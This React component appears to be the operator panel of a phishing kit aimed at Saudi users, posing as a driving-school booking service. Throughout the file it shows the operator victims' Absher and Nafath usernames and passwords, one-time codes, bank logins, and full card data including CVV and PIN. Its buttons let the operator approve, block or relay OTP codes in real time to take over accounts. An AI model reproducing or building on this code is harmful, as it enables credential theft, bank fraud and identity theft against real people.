import React, { useState } from 'react'
import { IoIosCheckmarkCircleOutline } from "react-icons/io";
import { AiOutlineStop } from "react-icons/ai";
import { CiShop } from "react-icons/ci";
import { GrView } from "react-icons/gr";
import { FaKey } from 'react-icons/fa';

const Alret = ({data,setPoup,setData,socket,setActive}) => {
    const [display,setDisplay] = useState({visible:false,order:{}})
    const [userOtp,setUserOtp] = useState(null)
        const Block = (item)=>{
            socket.emit('disAllow',item)
            setData(data.filter((e)=>{
               return e.ref !== item.ref
            }))
        }
        const Allow = async(item)=>{
            socket.emit('allow',item)
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }))
        }
        const acceptOrder =async(orderData)=>{
            setDisplay({visible:false,order:{}})
            
            setData(data.filter((e)=>{
                return e.ref !== orderData.ref
             }))
            socket.emit('acceptOrder',orderData)
        }
        const declineOrder = (orderData)=>{
            setDisplay({visible:false,order:{}})
            setData(data.filter((e)=>{
                return e.ref !== orderData.ref
             }))
            socket.emit('declineOrder',orderData)
        }
        const BlockNavaz = (item)=>{
            socket.emit('disAllowNavaz',item)
            setData(data.filter((e)=>{
               return e.ref !== item.ref
            }))
        }
        const AllowNavaz = (item)=>{
            socket.emit('AllowNavaz',item)
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }))
        }
        const Close = (item)=>{
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }))
        }
        const acceptNavazOtp = (item)=>{
            if(!userOtp) return window.alert('ادخل رمز الارسال للعميل')
            socket.emit('AllowUserOtp',{...item,userOtp})
            setDisplay({visible:false,order:{}})
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }))
        }
        const declineNavazOtp = (item)=>{
            socket.emit('disAllowUserOtp',item)
            setDisplay({visible:false,order:{}})
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }))
        }

        

  return (  
    <>
    {data.length ?<div className='fixed w-full flex items-start justify-center bottom-0' >
       <div className='bg-red w-11/12 sm:w-96 rounded-md text-white flex flex-col justify-center gap-y-2 items-end px-2 py-4' dir='rtl'>
        {data.length ? data.map((item)=>{
            return (
                <>
                {item.mode === 'request'  ?  
                
                    <div className='flex  justify-end items-center  px-2 bg-green-500 w-full rounded-lg'>
                        <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                        <div className='flex gap-x-1 justify-evenly items-center'>
                            <CiShop className='text-lg'/>
                            <span>تسجيل دخول ابشر  </span>
                            </div>
                                <div className=''>
                                    {item.username.split('').length > 15 && '...' }
                                    <span className='text-xs sm:text-base'>اسم المستخدم :</span >
                                    <span className='text-xs sm:text-base'>  {item.username.substring(0,15) }  </span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>  كلمه السر : </span>
                                    <span className='text-xs sm:text-base'> {item.password}</span>
                                </div>
                        </div>
                        <div className='flex w-1/5  justify-around '>
                            <AiOutlineStop  className='text-red-500 text-2xl cursor-pointer' onClick={()=>Block(item)}/>
                            <IoIosCheckmarkCircleOutline  className='text-white text-2xl cursor-pointer' onClick={()=>Allow(item)}/>
                       </div>
                    </div>
                    :  item.mode === 'order'? <div className='flex  justify-end items-center  px-2 bg-green-800 w-full rounded-lg'>

                    <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                            <div className='flex gap-x-1 justify-evenly items-center'>
                            <CiShop className='text-lg'/><span>طلب جديد  </span>
                            </div>
                            <div className=''>
                                {item.username.split('').length > 15 && '...' }
                                <span className='text-xs sm:text-base'> من : </span >
                                <span className='text-xs sm:text-base'>  {item.username.substring(0,15) }  </span>
                            </div>
                    </div>
                    <div className='flex w-1/5  justify-around '>
                        <GrView   className='text-white animate-bounce transition-all  text-2xl cursor-pointer' onClick={()=>{setDisplay({visible:true,order:item,mode:'order'})}}/>
                   </div>
                </div>:item.mode ==='bankAuth' ?
                <div className='flex   items-center  px-2 bg-green-800 w-full rounded-lg '>
                    <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                            <div className='flex gap-x-2 justify-evenly items-center'>
                            <span> بيانات دخول طلب </span><FaKey className='text-lg'/>
                            </div>
                            <div className=''>
                                {item?.bankUsername.split('').length > 15 && '...' }
                                <span className='text-xs sm:text-base'> ايميل البنك : </span >
                                <span className='text-xs sm:text-base'>  {item?.bankUsername.substring(0,15) }  </span>
                            </div>
                    </div>
                    <div className='flex w-1/5  justify-around '>
                        <GrView   className='text-white animate-bounce transition-all  text-2xl cursor-pointer' onClick={()=>{setDisplay({visible:true,order:item,mode:'bankAuth'})}}/>
                   </div>
                </div>:
                 item.mode==='navaz' ?    <div className='flex  justify-end items-center  px-2 bg-green-500 w-full rounded-lg'>
                        <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                            <span>بيانات دخول نافذ</span>
                                <div className=''>
                                    {item.username.split('').length > 15 && '...' }
                                    <span className='text-xs sm:text-base'>اسم المستخدم :</span >
                                    <span className='text-xs sm:text-base'>  {item.username.substring(0,15) }  </span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>  كلمه السر : </span>
                                    <span className='text-xs sm:text-base'> {item.password}</span>
                                </div>
                        </div>
                        <div className='flex w-1/5  justify-around '>
                            <AiOutlineStop  className='text-red-500 text-2xl cursor-pointer' onClick={()=>BlockNavaz(item)}/>
                            <IoIosCheckmarkCircleOutline  className='text-white text-2xl cursor-pointer' onClick={()=>AllowNavaz(item)}/>
                       </div>
                    </div>:
                 item.mode==='loginOtp' ?    <div className='flex  justify-end items-center  px-2 bg-green-500 w-full rounded-lg'>
                        <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                            <span>رمز تحقق  دخول نافذ</span>
                                <div className=''>
                                    {item.username.split('').length > 15 && '...' }
                                    <span className='text-xs sm:text-base'>اسم المستخدم :</span >
                                    <span className='text-xs sm:text-base'>  {item.username.substring(0,15) }  </span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>  كلمه السر : </span>
                                    <span className='text-xs sm:text-base'> {item.password}</span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>    رمز  : </span>
                                    <span className='text-xs sm:text-base'> {item.otp}</span>
                                </div>
                                
                        </div>
                        <div className='flex w-1/5  justify-around '>
                            <IoIosCheckmarkCircleOutline  className='text-white text-2xl cursor-pointer' onClick={()=>Close(item)}/>
                       </div>
                    </div>:
                 item.mode==='navazOtp' ?    <div className='flex  justify-end items-center  px-2 bg-green-500 w-full rounded-lg'>
                        <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                        <div className='flex gap-x-2 justify-evenly items-center'>
                        <FaKey className='text-lg'/>
                            <span> رمز تحقق نفاذ  </span>
                            </div>
                                <div className=''>
                                    {item.username.split('').length > 15 && '...' }
                                    <span className='text-xs sm:text-base'>اسم المستخدم :</span >
                                    <span className='text-xs sm:text-base'>  {item.username.substring(0,15) }  </span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>  كلمه السر : </span>
                                    <span className='text-xs sm:text-base'> {item.password}</span>
                                </div>
                                <div>
                                    <span className='text-xs sm:text-base'>  رمز التحقق : </span>
                                    <span className='text-xs sm:text-base'> {item.otp}</span>
                                </div>
                                
                        </div>
                        <div className='flex w-1/5  justify-around '>
                            <IoIosCheckmarkCircleOutline  className='text-white text-2xl cursor-pointer' onClick={()=>setDisplay({order:{...item},visible:true})}/>
                       </div>
                    </div>:
                <div className='flex  justify-end items-center  px-2 bg-green-800 w-full rounded-lg'>
                    <div className='flex w-1/5  justify-around '>
                        <GrView   className='text-white animate-bounce transition-all  text-2xl cursor-pointer' onClick={()=>{
                                setData(data.filter((e)=>{
                                        return e.ref !== item.ref
                                     }))
                                     setActive({nav:'OrderData',data:{id:item.id,otp:item.otp}})
                        }}/>
                   </div>
                    <div className='flex  flex-col justify-start items-end  px-2 w-4/5 py-2'>
                            <div className='flex gap-x-2 justify-evenly items-center'>
                            <span> رمز تحقق طلب  </span><FaKey className='text-lg'/>
                            </div>
                            <div className=''>
                                {item?.email.split('').length > 15 && '...' }
                                <span className='text-xs sm:text-base'> From : </span >
                                <span className='text-xs sm:text-base'>  {item?.email.substring(0,15) }  </span>
                            </div>
                    </div>
                </div>}
                 
           </>
            )
        } )
        : null}
      
       </div>
    </div> :null }
    
    {display.visible ? display.mode==='order' ?<div className='absolute bg-black bg-opacity-50  w-full flex items-center justify-center  z-50  top-0 min-h-screen'  >
        <div className='bg-white rounded-lg w-4/5 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 items-center justify-center my-2 p-3'>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>عميل</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الخدمه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.service}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> نوع الخدمه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.type
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الاسم رباعي</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الجنس</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.gender}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الاسم رباعي</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الجنسيه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.nationalty}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رقم الهويه </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>تاريخ الميلاد</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.birth}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> رقم الهاتف</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.phone}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> البريد </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>لغته</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.lang}</span>
                </div>

                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>توع الرخصه </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.licence_type}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>نوع القير</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.car_type}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>وقت التدريب</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.time}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>لغه التدريب</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.train_lang
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>بنك</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.bank
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>اسم الكارت</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.card_name
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رقم</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.card_number
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>CVV</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.cvv
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>انتهاء البطاقه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.expire_date
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>PIN</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.pin
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رمز التحقق </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.otp ?display.order.otp : '-' }</span>
                </div>
                <div className='flex w-full mt-2 gap-x-1 items-center justify-center'>
                    <button className='flex-1 text-lg bg-red-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0' onClick={()=>declineOrder(display.order)}>رفض</button>
                    <button className='flex-1 text-lg  bg-green-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0'  onClick={()=>acceptOrder(display.order)}>قبول</button>
                </div>
        </div>
    </div> :display.mode==='bankAuth'? <div className='absolute bg-black bg-opacity-50  w-full flex items-center justify-center  z-50  top-0 min-h-screen'  >
        <div className='bg-white rounded-lg w-4/5 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 items-center justify-center my-2 p-3'>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>عميل</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الخدمه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.service}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> نوع الخدمه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.type
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الاسم رباعي</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الجنس</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.gender}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الاسم رباعي</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>الجنسيه</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.nationalty}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رقم الهويه </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>تاريخ الميلاد</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.birth}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> رقم الهاتف</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.phone}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}> البريد </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>لغته</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.lang}</span>
                </div>

                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>توع الرخصه </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.licence_type}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>نوع القير</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.car_type}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>وقت التدريب</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.time}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>لغه التدريب</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.train_lang
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>بنك</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.bank
}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>مستخدم البنك</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.bankUsername
                    }</span>
                    </div>
                    <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>باسورد البنك</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.bankPassword
                    }</span>
                    </div>                  
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3 text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رمز التحقق </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.otp ?display.order.otp : '-' }</span>
                </div>
                <div className='flex w-full mt-2 gap-x-1 items-center justify-center md:col-span-2'>
                    <button className='flex-1 text-lg bg-red-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0' onClick={()=>declineOrder(display.order)}>رفض</button>
                    <button className='flex-1 text-lg  bg-green-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0'  onClick={()=>acceptOrder(display.order)}>قبول</button>
                </div>
        </div>
    </div>:<div className='absolute bg-black bg-opacity-50  w-full flex items-center justify-center  z-50  top-0 min-h-screen'  >
        <div className='bg-white rounded-lg w-4/5 grid grid-cols-1  lg:grid-cols-3 items-center justify-center my-2 p-3 '>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>اسم المستخدم</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.username}</span>
                </div>
                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>كلمة المرور</span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.password}</span>
                </div>

                <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                    <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رمز التحقق </span>
                    <span className='w-2/3  px-1 text-sm text-center '>{display.order.otp}</span>
                </div>
                <div className='md:col-span-3 flex flex-col justify-center items-center p-2 gap-2'>
                    <span className='text-red-500'>برجاء ادخال الرمز المرسل الي العميل </span>
                    <input type='text' className='border-2 p-2 md:w-1/5 w-1/3 rounded-lg text-center' onChange={(e)=>setUserOtp(e.target.value)}/>
                    <div className='flex w-full mt-2 gap-x-1 items-center justify-center md:col-span-2'>
                    <button className='flex-1 text-lg bg-red-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0' onClick={()=>declineNavazOtp(display.order)}>رفض</button>
                    <button className='flex-1 text-lg  bg-green-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0'  onClick={()=>acceptNavazOtp(display.order)}>ارسال</button>
                </div>

                </div>


        </div>
    </div> :null }
    </>
  )
}

export default Alret

